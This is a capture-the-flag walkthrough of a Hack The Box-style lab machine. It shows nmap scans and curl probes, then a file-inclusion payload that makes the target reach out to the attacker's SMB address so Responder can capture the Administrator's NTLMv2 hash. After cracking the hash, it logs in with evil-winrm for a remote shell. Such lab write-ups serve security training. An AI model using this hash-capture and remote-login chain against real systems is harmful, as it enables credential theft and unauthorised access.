# Responder

## Victim IP

`export target="10.129.197.73"`

## Attacker IP

`export attacker="10.10.14.94"`

## Open ports

```
sudo nmap -Pn -p- -sS -T4 ${target}                                                                                                                                                                  130 ⨯
[sudo] password for edward: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 22:22 EST
Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 41.96% done; ETC: 22:26 (0:02:06 remaining)
Nmap scan report for 10.129.197.73
Host is up (0.031s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 149.78 seconds
```

## Enumerate open ports

```
nmap -Pn -p80,5985,7680 -sC -sV ${target}
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 22:28 EST
Nmap scan report for 10.129.197.73
Host is up (0.0099s latency).

PORT     STATE    SERVICE   VERSION
80/tcp   open     http      Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open     http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
```

## Task 1

```
curl http://${target} 
<meta http-equiv="refresh" content="0;url=http://<REDACTED>/"> 
```

## Task 2

```
curl -I http://${target}                                                                                                                                                                             139 ⨯
HTTP/1.1 200 OK
Date: Sun, 20 Nov 2022 03:32:54 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m <REDACTED>
X-Powered-By: <REDACTED>
Content-Type: text/html; charset=UTF-8

```

## Task 3

`Explore the website, you'll find it easily`


## Task 4

`http://<REDACTED>.htb/index.php?<REDACTED>=<REDACTED>`

## Task 5

## Task 6

`google is your friend here`

## Task 7

Check the help menu of responder: `responder -h`

## Task 8

`google is your friend here`

## Task 9

- Start responder
- On the victim website, perform an smb request to a non-existent file: `http://<REDACTED>.htb/index.php?<REDACTED>=//10.10.14.94/idontexist`
- Back in the responder window, we should see the ntlm challenge hash
  ```
  [+] Listening for events...                                                                                                                                                                                    

  [SMB] NTLMv2-SSP Client   : 10.129.197.73
  [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
  [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<REDACTED>:<REDACTED>:<REDACTED>
  ```
- Submit hash to password cracker
- Retrieve password

## Task 10

`Check nmap output`

## Submit flag

Connect to the victim box using evil-winrm:

```
evil-winrm -i ${target} -u Administrator                                                                                                                                                               1 ⨯
Enter Password: 

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Search for the flag and submit
